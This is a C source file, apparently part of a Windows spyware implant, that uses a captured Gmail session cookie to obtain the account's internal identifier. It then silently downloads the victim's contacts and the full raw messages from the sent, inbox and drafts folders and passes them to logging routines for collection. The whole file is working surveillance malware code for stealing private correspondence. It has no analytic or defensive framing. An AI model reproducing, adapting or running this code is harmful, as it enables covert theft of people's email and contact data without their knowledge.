#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "debug.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "facebook.h"
#include "JSON.h"
#include "gmail.h"
#include "conf.h"


DWORD GMailParseContacts(LPSTR strCookie, LPSTR strIKValue, LPWSTR strUserName)
{
	LPWSTR strURI;
	LPSTR strRecvBuffer;
	DWORD dwRet, dwBufferSize;

	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strURI, 1024, _TRUNCATE,  L"/mail/?ui=2&ik=%S&view=au&rt=j", strIKValue); // FIXME ARRAY
	dwRet = HttpSocialRequest(L"mail.google.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
	zfree(strURI);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return dwRet;
	}

	LPSTR lpTmp, lpTmp2;

	lpTmp = strRecvBuffer;
	while (1)
	{
		DWORD dwFlags = 0;
		WCHAR strScreenName[256] = { L'\0' };
		WCHAR strMailAccount[256]= { L'\0' };

		lpTmp = strstr(lpTmp, GM_CONTACT_IDENTIFIER);
		if (!lpTmp)
			break;
		lpTmp += strlen(GM_CONTACT_IDENTIFIER);
		lpTmp2 = strchr(lpTmp, '"');
		if (!lpTmp2)
			break;
		
		*lpTmp2 = 0x0;
		_snwprintf_s(strScreenName, 256, _TRUNCATE, L"%S", lpTmp);
		
		lpTmp = lpTmp2+1;
		lpTmp = strstr(lpTmp, ",\""); // FIXME ARRAY
		if (!lpTmp)
			break;
		lpTmp += strlen(",\""); // FIXME ARRAY
		lpTmp2 = strchr(lpTmp, '"');
		if (!lpTmp2)
			break;
		
		*lpTmp2 = 0x0;
		_snwprintf_s(strMailAccount, 256, _TRUNCATE, L"%S", lpTmp);
		lpTmp = lpTmp2 + 1;

		if (!wcscmp(strMailAccount, strUserName))
			dwFlags |= CONTACTS_MYACCOUNT;

		SocialLogContactW(CONTACT_SRC_GMAIL, strScreenName, NULL,  NULL, NULL, NULL, NULL, NULL, NULL, strMailAccount, NULL, dwFlags);
	}

	zfree(strRecvBuffer);
	return SOCIAL_REQUEST_SUCCESS;
}

BOOL GMailParseForIK(LPSTR strBuffer, LPSTR *strIKValue, LPWSTR *strUserName)
{
	*strIKValue = NULL;
	*strUserName = NULL;

	LPSTR lpTmp, lpTmp2;
	lpTmp = strstr(strBuffer, GM_GLOBAL_IDENTIFIER);
	if (lpTmp)
	{
		for (DWORD i=0; i<9; i++)
		{
			lpTmp = strchr(lpTmp, ',');
			if (!lpTmp)
				return FALSE;
			lpTmp++;
		}
		lpTmp = strchr(lpTmp, '"');
		if (lpTmp)
		{
			lpTmp++;
			lpTmp2 = strchr(lpTmp, '"');
			if (lpTmp2)
			{
				*lpTmp2 = 0x0;
				*strIKValue = (LPSTR) zalloc(40);
				_snprintf_s(*strIKValue, 32, _TRUNCATE, "%s", lpTmp);

				lpTmp = lpTmp2+1;
				lpTmp = strchr(lpTmp, '"');
				if (lpTmp)
				{
					lpTmp++;
					lpTmp2 = strchr(lpTmp, '"');
					if (lpTmp2)
					{
						*lpTmp2 = 0x0;
						*strUserName = (LPWSTR) zalloc(256*sizeof(WCHAR));
						_snwprintf_s(*strUserName, 255, _TRUNCATE, L"%S", lpTmp);
					}
				}

				return TRUE;
			}
		}
	}

	return FALSE;
}

DWORD GMailGetIK(LPSTR strCookie, LPSTR *strIKValue, LPWSTR *strCurrentUserName)
{
	*strIKValue = NULL;
	*strCurrentUserName = NULL;

	LPWSTR strURI;
	LPSTR strRecvBuffer;
	DWORD dwRet, dwBufferSize;

	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?shva=1#%s", L"inbox"); // FIXME ARRAY
	//_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/u/0/?shva=1#%s", L"inbox"); // FIXME ARRAY
	dwRet = HttpSocialRequest(L"mail.google.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
	zfree(strURI);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return dwRet;
	}

	if (!GMailParseForIK(strRecvBuffer, strIKValue, strCurrentUserName))
	{
#ifdef _DEBUG
		OutputDebug(L"[!] Could not PARSE for IK\n");
#endif
		zfree(strRecvBuffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	return SOCIAL_REQUEST_SUCCESS;
}

DWORD GMailContactHandler(LPSTR strCookie)
{
	LPSTR strIKValue = NULL;
	LPWSTR strCurrentUserName = NULL;
	static WCHAR strLastUserName[256] = { L'\0' };

	if (!ConfIsModuleEnabled(L"addressbook"))
		return SOCIAL_REQUEST_SUCCESS;

	DWORD dwRet = GMailGetIK(strCookie, &strIKValue, &strCurrentUserName);
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return dwRet;

	if (wcscmp(strCurrentUserName, strLastUserName))
	{
		_snwprintf_s(strLastUserName, 256, _TRUNCATE, L"%s", strCurrentUserName);
		GMailParseContacts(strCookie, strIKValue, strLastUserName);
	}

	zfree(strIKValue);
	zfree(strCurrentUserName);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD GMailParseMailBox(LPWSTR strMailBoxName, LPSTR strCookie, LPSTR strIKValue, DWORD dwLastTSHigh, DWORD dwLastTS, BOOL bIncoming, BOOL bDraft)
{
	LPWSTR strURI;
	LPSTR strRecvBuffer;
	DWORD dwRet, dwBufferSize;

	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?ui=2&ik=%S&view=tl&start=0&num=70&rt=c&search=%s", strIKValue, strMailBoxName); // FIXME ARRAY
	dwRet = HttpSocialRequest(L"mail.google.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
	zfree(strURI);	
	
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return dwRet;
	}

	CHAR strMailId[20];
	LPSTR lpTmp = strRecvBuffer;

	while (1)
	{
		lpTmp = strstr(lpTmp, GM_MAIL_IDENTIFIER);
		if (!lpTmp)
			break;
		
		SecureZeroMemory(strMailId, sizeof(strMailId));
		memcpy(strMailId, lpTmp-21, 16);
		
		lpTmp += strlen(GM_MAIL_IDENTIFIER);
		if (!atoi(strMailId))
			continue;

		// TIMESTAMP
		DWORD dwCurrTS, dwCurrTSHigh;
		sscanf(strMailId, "%8x%8X", &dwCurrTSHigh, &dwCurrTS);
		if (dwCurrTSHigh > 2000000000)
			continue;
		if (dwCurrTSHigh < dwLastTSHigh)
			continue;
		if (dwCurrTSHigh == dwLastTSHigh && dwCurrTS <= dwLastTS)
			continue;
		SocialSetLastTimestamp(strIKValue, dwCurrTS, dwCurrTSHigh);

		
		LPSTR strRecvBuffer2;
		DWORD dwBufferSize2;

		strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
		_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?ui=2&ik=%S&view=om&th=%S", strIKValue, strMailId); // FIXME ARRAY
		dwRet = HttpSocialRequest(L"mail.google.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer2, &dwBufferSize2, strCookie); // FIXME ARRAY
		zfree(strURI);
		if (dwRet != SOCIAL_REQUEST_SUCCESS)
		{
			zfree(strRecvBuffer);
			return dwRet;
		}

		if (dwBufferSize2 && dwBufferSize2 > DEFAULT_MAX_MAIL_SIZE)
			dwBufferSize2 = DEFAULT_MAX_MAIL_SIZE;

		if (strRecvBuffer2 && dwBufferSize2, strstr(strRecvBuffer2, "Received: "))	// FIXME ARRAY
			SocialLogMailFull(MAIL_GMAIL, strRecvBuffer2, dwBufferSize2, bIncoming, bDraft);
		else
		{
			zfree(strRecvBuffer2);
			break;
		}

		zfree(strRecvBuffer2);
	}

	zfree(strRecvBuffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD GMailMessageHandler(LPSTR strCookie)
{
	if (!ConfIsModuleEnabled(L"messages"))
		return SOCIAL_REQUEST_SUCCESS;

#ifdef _DEBUG
	OutputDebug(L"[*] GMailMessageHandler\n");
#endif
	LPSTR strIKValue = NULL;
	LPWSTR strCurrentUserName = NULL;

	DWORD dwRet = GMailGetIK(strCookie, &strIKValue, &strCurrentUserName);
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return dwRet;

	DWORD dwLastTSHigh;
	DWORD dwLastTSLow = SocialGetLastTimestamp(strIKValue, &dwLastTSHigh);
	dwRet = GMailParseMailBox(L"sent", strCookie, strIKValue, dwLastTSHigh, dwLastTSLow, FALSE, FALSE);
	dwRet = GMailParseMailBox(L"inbox", strCookie, strIKValue, dwLastTSHigh, dwLastTSLow, FALSE, FALSE);
	dwRet = GMailParseMailBox(L"drafts", strCookie, strIKValue, dwLastTSHigh, dwLastTSLow, FALSE, FALSE);

	zfree(strIKValue);
	zfree(strCurrentUserName);
	return dwRet;
}